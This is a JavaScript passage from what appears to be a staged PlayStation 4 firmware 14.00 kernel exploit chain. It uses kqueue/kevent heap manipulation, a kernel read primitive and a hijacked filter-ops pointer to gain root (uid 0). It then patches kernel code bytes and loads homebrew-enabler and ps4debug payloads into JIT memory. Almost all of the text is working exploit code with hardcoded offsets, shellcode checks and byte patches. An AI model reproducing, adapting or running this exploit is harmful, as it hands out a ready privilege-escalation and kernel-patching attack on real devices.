        throw new Error("kread marker missing at " + h16(address) + " rc=" + rc);
      d.copyOut(gRes, resultBuf, 8);
      return get64(resultBuf.dv, 0);
    };
    const readBytes = (address, length) => {
      const aligned = address & ~7n;
      const shift = Number((address & 7n) * 8n);
      let value = runRead(aligned) >> BigInt(shift);
      if (shift + length * 8 > 64)
        value |= runRead(aligned + 8n) << BigInt(64 - shift);
      return Number(value & ((1n << BigInt(length * 8)) - 1n)) >>> 0;
    };
    let stock = 0, patched = 0, odd = 0, error = null;
    try {
      for (let i = 0; i < T.PG.length; i++) {
        const rva = T.PG[i];
        const got = readBytes(ka(rva), T.PGL[i]);
        const wantStock = T.PGN[i] >>> 0;
        const wantPatched = T.PGW[i] >>> 0;
        const state = got === wantStock ? "stock" :
          got === wantPatched ? "patched" : "odd";
        if (state === "stock") stock++;
        else if (state === "patched") patched++;
        else odd++;
        log("I-GUARD", "i=" + i + " rva=" + h16(rva) +
          " len=" + T.PGL[i] + " got=" + h16(got) +
          " stock=" + h16(wantStock) + " patched=" + h16(wantPatched) +
          " state=" + state);
      }
    } catch (e) {
      error = String(e);
      log("I-GUARD-ERROR", error);
    }
    guards = { stock, patched, odd, error };
    log("I-GUARDS", "stock=" + stock + " patched=" + patched +
      " odd=" + odd + " total=" + T.PG.length + " error=" + (error || "none"));

    if (applyPatch) {
      patchResult = { attempted: false, applied: false, error: null };
      if (stock !== T.PG.length || patched !== 0 || odd !== 0 ||
          error || uidAfter !== 0) {
        patchResult.error = "guard/UID gate stock=" + stock +
          " patched=" + patched + " odd=" + odd + " uid=" + uidAfter +
          " error=" + (error || "none");
        log("J-PATCH-SKIP", patchResult.error);
      } else {
        // probe pc 10197-11265: map the published 632-byte 14.00 payload,
        // temporarily substitute f_touch, then verify sysent and guards.
        let swapped = false;
        const pointerBuf = allocBuf(8);
        const pointerCheck = allocBuf(8);
        try {
          if (T.PKB_BYTES !== 632 || T.PKB.length !== 1264)
            throw new Error("1400 blob size mismatch");
          const jfd = scn("jitshm_create", 0, 16384, 7);
          log("J-JITFD", "fd=" + jfd);
          if (jfd < 0) throw new Error("jitshm_create rc=" + jfd);
          const mmapAddr = (hint, flags) => {
            const m = scn64("mmap", hint, 16384, 7, flags, jfd, 0);
            return (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
          };
          let execAddr = mmapAddr(0x940900000n, 17);
          if (execAddr === 0xffffffffffffffffn || execAddr < 0x10000n) {
            execAddr = mmapAddr(0n, 1);
            log("J-JIT-FLOAT", "addr=" + h16(execAddr));
          }
          if (execAddr === 0xffffffffffffffffn || execAddr < 0x10000n)
            throw new Error("jitshm mmap failed");
          const payload = allocBuf(632);
          const bytes = new Uint8Array(payload.ab);
          for (let i = 0; i < 632; i++)
            bytes[i] = parseInt(T.PKB.slice(i * 2, i * 2 + 2), 16);
          if (bytes[0] !== 0xb9 || bytes[1] !== 0x82 || bytes[631] !== 0xc3)
            throw new Error("1400 blob signature");
          d.copyIn(execAddr, payload, 632);
          const copyCheck = allocBuf(632);
          d.copyOut(execAddr, copyCheck, 632);
          const got = new Uint8Array(copyCheck.ab);
          for (let i = 0; i < 632; i++)
            if (got[i] !== bytes[i]) throw new Error("blob readback byte=" + i);
          log("J-BLOB", "addr=" + h16(execAddr) + " fd=" + jfd +
            " bytes=632 head=b982 tail=c3 verified=true");

          put64(pointerBuf.dv, 0, execAddr);
          d.copyIn(f.fakeOps + 32n, pointerBuf, 8);
          swapped = true;
          d.copyOut(f.fakeOps + 32n, pointerCheck, 8);
          if (get64(pointerCheck.dv, 0) !== execAddr)
            throw new Error("f_touch swap readback");
          zeroBuf(event);
          put64(event.dv, 0, gIdent);
          event.dv.setInt16(8, -23, true);
          event.dv.setInt16(10, 1, true);
          if (ctx().markSync) ctx().markSync("J-PATCH-BEFORE",
            "kq=" + rootKq + " exec=" + h16(execAddr) + " kbase=" + h16(STATE.kbase));
          patchResult.attempted = true;
          const patchRc = scn("kevent", rootKq, event.addr, 1, 0, 0, 0);
          log("J-PATCH-AFTER", "rc=" + patchRc);
        } catch (e) {
          patchResult.error = String(e);
          log("J-PATCH-ERROR", patchResult.error);
        }
        if (swapped) {
          try {
            put64(pointerBuf.dv, 0, f.touch);
            d.copyIn(f.fakeOps + 32n, pointerBuf, 8);
            d.copyOut(f.fakeOps + 32n, pointerCheck, 8);
            if (get64(pointerCheck.dv, 0) !== f.touch)
              throw new Error("f_touch restore readback");
            log("J-TOUCH-RESTORED", h16(f.touch));
          } catch (e) {
            fin("J f_touch restore failed: " + e);
          }
        }
        zeroBuf(event);
        put64(event.dv, 0, gIdent);
        event.dv.setInt16(8, -23, true);
        event.dv.setInt16(10, 1, true);
        put64(event.dv, 32, ka(P[17]));
        put64(event.dv, 40, gStack);
        if (patchResult.attempted && !patchResult.error) {
          try {
            const sysCall = runRead(ka(P[0]));
            let patchedFirstSix = 0;
            for (let i = 0; i < 6; i++)
              if (readBytes(ka(T.PG[i]), T.PGL[i]) === (T.PGW[i] >>> 0))
                patchedFirstSix++;
            const narg = readBytes(ka(P[0] - 8), 4);
            patchResult.applied = sysCall === ka(P[1]) &&
              patchedFirstSix === 6 && narg === 2;
            log("K-PATCH-CHECK", "syscall11=" + h16(sysCall) +
              " want=" + h16(ka(P[1])) + " first6=" + patchedFirstSix +
              " narg=" + narg + " applied=" + patchResult.applied);
            if (ctx().params.get("ps4debug") === "1") {
              // These 12 windows are extracted from the operator's binary,
              // which differs from the published source guard table.
              const debugGuards = [
                [0x3b3830, 6, "554889e5e857", "b801000000c3"],
                [0x3b38a0, 6, "554889e5488b", "b801000000c3"],
                [0x3b38c0, 6, "554889e5f647", "b801000000c3"],
                [0x76c530, 1, "55", "c3"],
                [0x1fc801, 5, "e83a634400", "31c0909090"],
                [0x2fcb5c, 6, "eb04ad070000", "909090909090"],
                [0x3673f5, 1, "77", "eb"],
                [0x3678e1, 5, "488b410844", "e97c020000"],
                [0x4787b4, 2, "740b", "9090"],
                [0x46660c, 1, "03", "07"],
                [0x466614, 1, "03", "07"],
                [0x3045be, 6, "0f8598000000", "909090909090"],
              ];
              const readHex = (rva, length) => {
                let hex = "";
                for (let at = 0; at < length; at += 4) {
                  const count = Math.min(4, length - at);
                  const value = readBytes(ka(rva + at), count);
                  for (let i = 0; i < count; i++)
                    hex += ((value >>> (i * 8)) & 0xff).toString(16).padStart(2, "0");
                }
                return hex;
              };
              const mismatches = [];
              for (let i = 0; i < debugGuards.length; i++) {
                const [rva, length, accepted, replacement] = debugGuards[i];
                const got = readHex(rva, length);
                const state = got === accepted ? "accepted" :
                  got === replacement ? "replacement" : "mismatch";
                log("DBG-GUARD", "i=" + i + " rva=" + h16(rva) +
                  " got=" + got + " accepted=" + accepted +
                  " replacement=" + replacement + " state=" + state);
                if (state === "mismatch") mismatches.push(i);
              }
              patchResult.debugCompatible = mismatches.length === 0;
              log("DBG-GUARDS", "compatible=" + patchResult.debugCompatible +
                " mismatches=" + mismatches.join(",") +
                " total=" + debugGuards.length);
            }
          } catch (e) {
            patchResult.error = String(e);
            log("K-PATCH-ERROR", patchResult.error);
          }
        }
      }
    }

    // safeDown: restore the live filter slot before removing the knote.
    const downWords = [ka(P[23]), gCtx, ka(P[18]),
      ka(P[21]), f.slot, ka(P[22]), f.ops, ka(P[28]), 0n, ...kb1];
    const downBuf = allocBuf(downWords.length * 8);
    zeroBuf(downBuf);
    for (let i = 0; i < downWords.length; i++)
      put64(downBuf.dv, i * 8, downWords[i]);
    d.copyIn(gStack, downBuf, downBuf.ab.byteLength);
    d.copyIn(gMark, zeroQ, 8);
    if (ctx().markSync) ctx().markSync("I-DOWN-BEFORE", "slot=" + h16(f.slot));
    const downRc = scn("kevent", rootKq, event.addr, 2, 0, 0, 0);
    d.copyOut(gMark, resultBuf, 8);
    const downMark = get64(resultBuf.dv, 0);
    log("I-DOWN-AFTER", "rc=" + downRc + " marker=" + h16(downMark) +
      " restored=" + (downMark === marker));
    if (downMark !== marker) fin("I slot restoration marker missing");
  }

  zeroBuf(event);
  put64(event.dv, 0, gIdent);
  event.dv.setInt16(8, -23, true);
  event.dv.setInt16(10, 2, true);
  const deleteRc = scn("kevent", rootKq, event.addr, 1, 0, 0, 0);
  const closeRc = scn("close", rootKq);
  log("G-DOWN", "delete=" + deleteRc + " kq_close=" + closeRc +
    " slot=" + h16(f.slot) + " ops=" + h16(f.ops));
  if (deleteRc !== 0 || closeRc !== 0) fin("G bridge teardown failed");
  return { slot: f.slot, ops: f.ops, marker: observed, uidBefore, uidAfter, guards, patchResult };
}

// Launch the bundled BD-J HEN flat payload only after the kernel patch
// readbacks and bridge teardown. The pthread entry is pinned to the
// independently captured 14.00 libkernel_web RX image.
async function stage10Payload(c, d) {
  const uid = scn("getuid");
  const sandboxStub = c.stubAddr.get(585) || findStubRaw(585);
  let sandbox = null;
  if (sandboxStub) {
    const r = c.callAddr(toI64(sandboxStub), [0, 0, 0, 0, 0, 0]);
    sandbox = r.i32;
  }
  log("L-AUTHORITY", "getuid=" + uid + " is_in_sandbox=" +
    (sandbox === null ? "stub-missing" : sandbox));
  if (uid !== 0) fin("L uid was not retained after bridge cleanup");

  const mprotectStub = c.stubAddr.get(74) || findStubRaw(74);
  const trial = scn64("mmap", 0, 16384, 3, 4098, -1, 0);
  const trialAddr = (BigInt(trial.hi >>> 0) << 32n) | BigInt(trial.lo >>> 0);
  if (trialAddr !== 0xffffffffffffffffn && trialAddr >= 0x10000n) {
    if (mprotectStub) {
      const rv = c.callAddr(toI64(mprotectStub),
        [toI64(trialAddr), toI64(16384), toI64(7), 0, 0, 0]).i32;
      const err = rv === -1 ? c.errno() : 0;
      log("L-MPROTECT", "rw_to_rwx=" + rv + " errno=" + err +
        " page=" + h16(trialAddr));
    } else {
      log("L-MPROTECT", "stub-missing");
    }
    scn("munmap", trialAddr, 16384);
  } else {
    log("L-MPROTECT", "anon mmap failed=" + h16(trialAddr));
  }

  const blob = await c.fetchFile("hen.bin");
  c.keepAlive.push(blob);
  if (blob.length !== 562240 || blob[0] !== 0xe9 ||
      blob[1] !== 0xa6 || blob[2] !== 0x4a ||
      blob[3] !== 0 || blob[4] !== 0 ||
      blob.subarray(5, 32).some(v => v !== 0))
    fin("L payload signature/length=" + blob.length + "/" + blob[0]);
  for (const offset of [0x4cc9, 0x4d18]) {
    const expected = [0x31, 0xc0, 0x90, 0x90, 0x90];
    if (expected.some((value, i) => blob[offset + i] !== value))
      fin("L HEN no-file-gate image mismatch at " + h16(offset));
  }
  log("L-HEN-SOURCE", "donated BD-J image with file-log return gates disabled sha256=756077919fd59abd0eb3ae7b96b6295349b2a0a1b6a7d5c99b3c6898c4abe753");
  // Hx1400.probe pc 14193-14626: patch eight embedded ASCII config bytes.
  const cfgOffsets = P.slice(4, 12);
  const cfgWanted = [1, 1, 1, 1, 0, 0, 1, 1];
  const cfgReadback = [];
  for (let i = 0; i < cfgOffsets.length; i++) {
    const offset = cfgOffsets[i];
    const before = blob[offset];
    if (offset >= blob.length || (before !== 0x30 && before !== 0x31))
      fin("L HEN config byte invalid at " + h16(offset) + ": " + h16(before));
    blob[offset] = 0x30 + cfgWanted[i];
    if (blob[offset] !== 0x30 + cfgWanted[i])
      fin("L HEN config write failed at " + h16(offset));
    cfgReadback.push(i + ":" + String.fromCharCode(before) +
      "->" + String.fromCharCode(blob[offset]));
  }
  log("L-HEN-CONFIG", cfgReadback.join(","));

  // Match the published BD-J loader's 0x90000 JITSHM span and map hint.
  const size = 589824;
  const jfd = scn("jitshm_create", 0, size, 7);
  log("L-HEN-JITFD", "fd=" + jfd + " span=" + size);
  if (jfd < 0) fin("L HEN jitshm_create failed");
  const mapJit = (hint, flags) => {
    const m = scn64("mmap", hint, size, 7, flags, jfd, 0);
    return (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
  };
  let entry = mapJit(0x950000000n, 17);
  if (entry === 0xffffffffffffffffn || entry < 0x10000n) {
    entry = mapJit(0, 1);
    log("L-HEN-JIT-FLOAT", "entry=" + h16(entry));
  }
  log("L-PAYLOAD-MAP", "entry=" + h16(entry) + " size=" + size +
    " bytes=" + blob.length + " fd=" + jfd);
  if (entry === 0xffffffffffffffffn || entry < 0x10000n)
    fin("L payload JITSHM map failed");
  const chunk = allocBuf(8192);
  const check = allocBuf(8192);
  const out = new Uint8Array(chunk.ab), got = new Uint8Array(check.ab);
  out.fill(0);
  for (let at = 0; at < size; at += 8192)
    d.copyIn(entry + BigInt(at), chunk, 8192);
  log("L-HEN-ZERO", "bytes=" + size);
  for (let at = 0; at < blob.length; at += 8192) {
    const n = Math.min(8192, blob.length - at);
    out.fill(0);
    out.set(blob.subarray(at, at + n));
    d.copyIn(entry + BigInt(at), chunk, n);
    d.copyOut(entry + BigInt(at), check, n);
    for (let i = 0; i < n; i++)
      if (got[i] !== out[i]) fin("L payload copy mismatch at " + (at + i));
  }
  log("L-PAYLOAD-COPY", "bytes=" + blob.length + " exact=true");
  for (let at = blob.length; at < size; at += 8192) {
    const n = Math.min(8192, size - at);
    d.copyOut(entry + BigInt(at), check, n);
    for (let i = 0; i < n; i++)
      if (got[i] !== 0) fin("L HEN BSS nonzero at " + (at + i));
  }
  log("L-HEN-BSS", "zero_from=" + blob.length + " span=" + size);

  // The donated image's entry returns a 0..9 status. Earlier thread-based
  // runs recorded only pthread_create, leaving the payload result unknown.
  if (c.params.get("goldhen") === "1") {
    if (c.markSync) c.markSync("L-HEN-DIRECT-BEFORE",
      "entry=" + h16(entry) + " bytes=" + blob.length);
    const rv = c.callAddr(toI64(entry),
      [toI64(0), toI64(0), toI64(0),
       toI64(0), toI64(0), toI64(0)]);
    log("L-HEN-DIRECT-RETURN", "rc=" + rv.i32 +
      " complete=" + (rv.i32 === 0));
    await new Promise(resolve => setTimeout(resolve, 3000));
    log("L-HEN-DIRECT-AFTER", "getuid=" + scn("getuid") +
      " direct_rc=" + rv.i32);
    return rv.i32 === 0;
  }

  const readStub = num(c.stubAddr.get(3));
  const rxBase = readStub - 0x2c160n;
  if ((rxBase & 0x3fffn) !== 0n)
    fin("L libkernel_web RX base from read stub is unaligned: " + h16(rxBase));
  const threadEntry = rxBase + 0x15270n;
  const expected = [0xe5894855, 0x015687e8, 0x00888d00, 0x85800200];
  const actual = expected.map((_, i) =>
    c.p.read4(toI64(threadEntry + BigInt(i * 4))) >>> 0);
  const signatureOk = actual.every((v, i) => v === expected[i]);
  log("L-PTHREAD", "rxBase=" + h16(rxBase) + " readStub=" + h16(readStub) +
    " addr=" + h16(threadEntry) + " words=" +
    actual.map(h16).join(",") + " signature=" + signatureOk);
  if (!signatureOk) fin("L 14.00 pthread_create signature mismatch");

  const handle = allocBuf(8);
  zeroBuf(handle);
  const paths = [
    "/data/hen", "/data/hen/hen.ini", "/data/hen/version.txt",
    "/data/hen/plugin_loader.prx", "/user/temp/hen.installed",
    "/data/cole-goldhen-disc-v1.bin",
    "/data/cole-compatibility-audit-v1.bin",
  ];
  const auditPaths = (phase) => {
    let found = 0;
    log("L-HEN-AUDIT-START", "phase=" + phase + " getuid=" + scn("getuid"));
    for (const path of paths) {
      const pathBuf = allocBuf(path.length + 1);
      const bytes = new Uint8Array(pathBuf.ab);
      for (let i = 0; i < path.length; i++) bytes[i] = path.charCodeAt(i);
      bytes[path.length] = 0;
      const fd = scn("open", pathBuf.addr, 0, 0);
      const err = fd < 0 ? c.errno() : 0;
      log("L-HEN-OPEN", "phase=" + phase + " path=" + path +
        " fd=" + fd + " errno=" + err);
      if (fd >= 0) {
        found++;
        log("L-HEN-CLOSE", "phase=" + phase + " path=" + path +
          " rc=" + scn("close", fd));
      }
    }
    log("L-HEN-AUDIT-END", "phase=" + phase + " found=" + found +
      "/" + paths.length);
    return found;
  };
  const foundBefore = auditPaths("before");
  if (c.markSync) c.markSync("L-PAYLOAD-BEFORE",
    "entry=" + h16(entry) + " pthread=" + h16(threadEntry) +
    " bytes=" + blob.length + " args=handle,0,entry,0,0,0");
  const launch = c.callAddr(toI64(threadEntry),
    [toI64(handle.addr), toI64(0), toI64(entry),
     toI64(0), toI64(0), toI64(0)]);
  const handleValue = BigInt(handle.dv.getUint32(0, true)) |
    (BigInt(handle.dv.getUint32(4, true)) << 32n);
  const started = launch.i32 === 0 && handleValue !== 0n;
  log("L-PAYLOAD-AFTER", "pthread_create=" + launch.i32 +
    " handle=" + h16(handleValue) + " started=" + started);
  if (started) {
    for (const delay of [3000, 7000]) {
      await new Promise(resolve => setTimeout(resolve, delay));
      const phase = delay === 3000 ? "after-3s" : "after-10s";
      const found = auditPaths(phase);
      log("L-HEN-AUDIT-DELTA", "phase=" + phase + " before=" +
        foundBefore + " after=" + found);
    }
  }
  return started;
}

// Small userland proof on the patched boot. The flat image posts a marker
// directly to the local collector and updates an in-image status word.
export async function runMini(c) {
  STATE.ctx = c;
  ensureStubs();
  const blob = await c.fetchFile("mini_net.bin");
  c.keepAlive.push(blob);
  const statusOff = 213;
  if (blob.length !== 385 || blob[0] !== 0x53 ||
      blob[statusOff] !== 0xef || blob[statusOff + 1] !== 0xbe ||
      blob[statusOff + 2] !== 0xad || blob[statusOff + 3] !== 0xde)
    fin("MINI image signature/length mismatch");
  log("MINI-SOURCE", "bytes=" + blob.length +
    " sha256=1a408183ac8f8678b597c6296e6c952a23c05ae0991ddda3cbea1e0f39d93361");
  log("MINI-UID-PREMAP", "getuid=" + scn("getuid"));

  const jfd = scn("jitshm_create", 0, 16384, 7);
  if (jfd < 0) fin("MINI jitshm_create rc=" + jfd + " errno=" + c.errno());
  const m = scn64("mmap", 0, 16384, 7, 1, jfd, 0);
  const entry = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
  log("MINI-MAP", "entry=" + h16(entry) + " fd=" + jfd);
  if (entry === 0xffffffffffffffffn || entry < 0x10000n)
    fin("MINI JIT map failed");
  for (let o = 0; o < blob.length; o += 8) {
    let word = 0n;
    for (let k = 0; k < 8; k++)
      word |= BigInt(blob[o + k] || 0) << BigInt(k * 8);
    c.p.write8(toI64(entry + BigInt(o)), toI64(word));
  }
  for (let o = 0; o < blob.length; o++)
    if ((c.p.read1(toI64(entry + BigInt(o))) & 0xff) !== blob[o])
      fin("MINI copy mismatch at " + o);
  log("MINI-COPY", "bytes=" + blob.length + " exact=true");
  log("MINI-STATUS-BEFORE", h16(c.p.read4(toI64(entry + BigInt(statusOff))) >>> 0));

  const readStub = num(c.stubAddr.get(3));
  const rxBase = readStub - 0x2c160n;
  if ((rxBase & 0x3fffn) !== 0n)
    fin("MINI libkernel_web RX base unaligned");
  const threadEntry = rxBase + 0x15270n;
  const expected = [0xe5894855, 0x015687e8, 0x00888d00, 0x85800200];
  const actual = expected.map((_, i) =>
    c.p.read4(toI64(threadEntry + BigInt(i * 4))) >>> 0);
  if (!actual.every((v, i) => v === expected[i]))
    fin("MINI pthread signature mismatch");
  const handle = allocBuf(8);
  zeroBuf(handle);
  log("MINI-UID", "getuid=" + scn("getuid"));
  if (c.markSync) c.markSync("MINI-BEFORE",
    "entry=" + h16(entry) + " pthread=" + h16(threadEntry));
  const rv = c.callAddr(toI64(threadEntry),
    [toI64(handle.addr), toI64(0), toI64(entry),
     toI64(0), toI64(0), toI64(0)]);
  const handleValue = BigInt(handle.dv.getUint32(0, true)) |
    (BigInt(handle.dv.getUint32(4, true)) << 32n);
  log("MINI-THREAD", "rc=" + rv.i32 + " handle=" + h16(handleValue));
  if (rv.i32 !== 0 || handleValue === 0n) return false;
  for (let attempt = 0; attempt < 16; attempt++) {
    await new Promise(resolve => setTimeout(resolve, 500));
    const status = c.p.read4(toI64(entry + BigInt(statusOff))) >>> 0;
    const error = c.p.read4(toI64(entry + BigInt(statusOff + 4))) >>> 0;
    log("MINI-STATUS", "attempt=" + attempt + " status=" + h16(status) +
      " syscall_return=" + h16(error));
    if (status === 0x600d0002 || (status & 0xffff0000) === 0xbad00000)
      return status === 0x600d0002;
  }
  return false;
}

// Launch the operator-supplied ps4debug-NG image after syscall 11 is live.
// The adapted image's accepted bytes are checked through the live ROP read
// before the filter bridge is removed.
async function runPs4Debug(c, d) {
  STATE.ctx = c;
  ensureStubs();
  if (scn("getuid") !== 0) fin("DBG getuid changed before launch");
  const blob = await c.fetchFile("ps4debug_silver.bin");
  c.keepAlive.push(blob);
  if (blob.length !== 3277904 || blob[0] !== 0xe9 || blob[1] !== 0x0b ||
      blob[2] !== 0x29 || blob[3] !== 0 || blob[4] !== 0)
    fin("DBG image signature/length mismatch");
  log("DBG-SOURCE", "bytes=" + blob.length +
    " sha256=cac8655d37794523f394825d5d71214ec6ffdc24d3cd65db1e0fbd64b36b793e");
  // Replace only three nonessential printf calls with stage return markers.
  // The original runinstaller returns 1 for every failed step; these edits
  // preserve its calls and branches and make rc identify the failing step.
  const diagnostics = [
    [0x28b4, "488d3da559000031c041ff16", 2], // patch_kernel
    [0x28c9, "488d3d0459000031c041ff16", 3], // load_kdebugger
    [0x28de, "488d3d1856000031c041ff16", 4], // load_debugger
  ];
  for (const [offset, expectedHex, stage] of diagnostics) {
    const expectedBytes = expectedHex.match(/../g).map(x => parseInt(x, 16));
    if (expectedBytes.some((value, i) => blob[offset + i] !== value))
      fin("DBG diagnostic image mismatch at " + h16(offset));
    blob[offset] = 0xbb; // mov ebx, imm32
    blob[offset + 1] = stage;
    blob.fill(0, offset + 2, offset + 5);
    blob.fill(0x90, offset + 5, offset + 12);
    log("DBG-DIAG-PATCH", "offset=" + h16(offset) + " failure_rc=" + stage);
  }
  const size = 0x500000;
  const jfd = scn("jitshm_create", 0, size, 7);
  log("DBG-JITFD", "fd=" + jfd + " span=" + size);
  if (jfd < 0) fin("DBG jitshm_create rc=" + jfd + " errno=" + c.errno());
  const m = scn64("mmap", 0, size, 7, 1, jfd, 0);
  const entry = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
  if (entry === 0xffffffffffffffffn || entry < 0x10000n)
    fin("DBG JIT map failed entry=" + h16(entry));
  log("DBG-MAP", "entry=" + h16(entry) + " fd=" + jfd + " span=" + size);
  const chunk = allocBuf(8192), check = allocBuf(8192);
  const out = new Uint8Array(chunk.ab), got = new Uint8Array(check.ab);
  out.fill(0);
  for (let at = 0; at < size; at += 8192)
    d.copyIn(entry + BigInt(at), chunk, 8192);
  log("DBG-ZERO", "bytes=" + size);
  for (let at = 0; at < blob.length; at += 8192) {
    const n = Math.min(8192, blob.length - at);
    out.fill(0);
    out.set(blob.subarray(at, at + n));
    d.copyIn(entry + BigInt(at), chunk, n);
    d.copyOut(entry + BigInt(at), check, n);
    for (let i = 0; i < n; i++)
      if (got[i] !== out[i]) fin("DBG image copy mismatch at " + (at + i));
  }
  log("DBG-COPY", "bytes=" + blob.length + " diagnostic_image_exact=true");

  if (c.markSync) c.markSync("DBG-DIRECT-BEFORE",
    "entry=" + h16(entry) + " bytes=" + blob.length);
  const rv = c.callAddr(toI64(entry),
    [toI64(0), toI64(0), toI64(0),
     toI64(0), toI64(0), toI64(0)]);
  log("DBG-DIRECT-RETURN", "rc=" + rv.i32 +
    " meaning=" + ({0:"installed",1:"init_ksdk",2:"patch_kernel",
      3:"load_kdebugger",4:"load_debugger"}[rv.i32] || "other"));
  await new Promise(resolve => setTimeout(resolve, 3000));
  log("DBG-AFTER", "getuid=" + scn("getuid") + " direct_rc=" + rv.i32);
  return rv.i32 === 0;
}

export async function runKevent(c) {
  STATE.ctx = c;
  const kob = c.params && c.params.get ? c.params.get("kbase") : null;
  if (kob) {
    STATE.kbase = BigInt(kob);
    log("KEVENT-KBASE-OVERRIDE", h16(STATE.kbase));
  } else {
    if (!c.kbase) fin("kbase not provided - run route leak first");
    STATE.kbase = num(c.kbase);
  }
  log("KEVENT-PORT", "kbase=" + h16(STATE.kbase));

  const magic = ctx().p.read4(toI64(ctx().libkernelBase)) >>> 0;
  log("NATIVES-PROBE", "elf_magic=0x" + magic.toString(16) + " (0x464c457f=headers-mapped)");

  ensureStubs();
  log("NATIVES", Object.keys(NUM).map((k) => k + "=" + NUM[k] + "@0x" +
      num(ctx().stubAddr.get(NUM[k])).toString(16)).join(" "));

  const scratch16a = allocBuf(16), scratch16b = allocBuf(16);
  const buf32k = allocBuf(32768);
  const buf200 = allocBuf(200);
  const rth = allocBuf(512);
  const cl = allocBuf(64);
  log("ARENA", "blocks allocated");

  const stage3 = !!(c.params && c.params.get && c.params.get("stage3") === "1");
  // Preserve the eight-socket layout that reached HELD on this console.
  const anchorFd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
  const victimCount = 8;
  const victims = [];
  for (let i = 0; i < victimCount; i++) {
    victims.push(scn("socket", AF_INET, SOCK_STREAM, 0));
  }
  log("VICTIMS", "anchor=" + anchorFd + " victims=" + victims.join(","));

  const { fds } = phaseSpray(256);

  const mr = scn64("mmap", 0, 16384, 3, 4098, -1, 0);
  const page = (BigInt(mr.hi >>> 0) << 32n) | BigInt(mr.lo >>> 0);
  log("MMAP-ANON", "page=" + h16(page));
  if (page < 0x10000n) fin("mmap anon failed rv=" + mr.i32 + " errno=" + ctx().errno());

  const leakKq = scn("kqueue");
  if (leakKq < 0) fin("leak kqueue");

  const res = phase2Leak(leakKq, fds);
  if (stage3) {
    const dAnchor = scn("socket", AF_INET, SOCK_DGRAM, 0);
    if (dAnchor < 3) fin("D anchor socket rc=" + dAnchor);
    const dVictims = [];
    for (let i = 0; i < 160; i++) {
      const fd = scn("socket", AF_INET, SOCK_DGRAM, 0);
      if (fd < 3) fin("D victim socket index=" + i + " rc=" + fd);
      dVictims.push(fd);
    }
    log("D-SOCKETS", "anchor=" + dAnchor + " victims=" + dVictims.length +
      " first=" + dVictims[0] + " last=" + dVictims[dVictims.length - 1]);
    const d = stage3Leak(res, leakKq, fds, dAnchor, dVictims);
    if (c.params.get("stage4") === "1") {
      const e = stage4Gadget(d);
      if (c.params.get("stage5") === "1") {
        const f = stage5Rotate(d, e);
        if (c.params.get("stage6") === "1") {
          const applyPatch = c.params.get("stage9") === "1";
          const guardScan = applyPatch || c.params.get("stage8") === "1";
          const credential = guardScan || c.params.get("stage7") === "1";
          const g = stage6Bridge(d, f, credential, guardScan, applyPatch);
          if (applyPatch && c.params.get("stage10") === "1") {
            if (!g.patchResult.applied) fin("L kernel patch verification failed");
            if (c.params.get("ps4debug") === "1") {
              if (!g.patchResult.debugCompatible)
                fin("DBG embedded guard mismatch; see DBG-GUARD markers");
              return await runPs4Debug(c, d);
            }
            if (c.params.get("mini") === "1") return await runMini(c);
            return await stage10Payload(c, d);
          }
          if (applyPatch) fin("K 1400.bin applied=" + g.patchResult.applied +
            " attempted=" + g.patchResult.attempted +
            " error=" + (g.patchResult.error || "none") +
            " uid=" + g.uidAfter + "; bridge restored");
          if (guardScan) fin("I guard scan stock=" + g.guards.stock +
            " patched=" + g.guards.patched + " odd=" + g.guards.odd +
            " error=" + (g.guards.error || "none") + " uid=" + g.uidAfter +
            "; stopping before 1400.bin");
          if (credential) fin("H credential chain complete uid=" + g.uidBefore +
            "->" + g.uidAfter + " marker=" + h16(g.marker) +
            "; stopping before executable-page patches");
          fin("G bridge restored slot=" + h16(g.slot) +
            " marker=" + h16(g.marker) + "; stopping before kernel patches");
        }
        fin("F fakeOps installed at " + h16(f.fakeOps) +
          " slot=" + h16(f.slot) + "; stopping before EV_ADD -23");
      }
      fin("E rotation gadget passed root=" + h16(e.root) +
        " link=" + h16(e.link) + "; stopping before slot rotation");
    }
    fin("D tree pointer=" + h16(d.tree) + " victim=" + d.victim +
      "; continuation stops before fakeops rotation");
  }
  log("SLOT", "R_SLOT=" + h16(ka(P[13])) + " R_OPS=" + h16(ka(P[14])));
  fin("stage2 DONE (kva held). Next: one-time EV_ADD -23 + fakeops build (bytecode pc 6760-9200)");
}
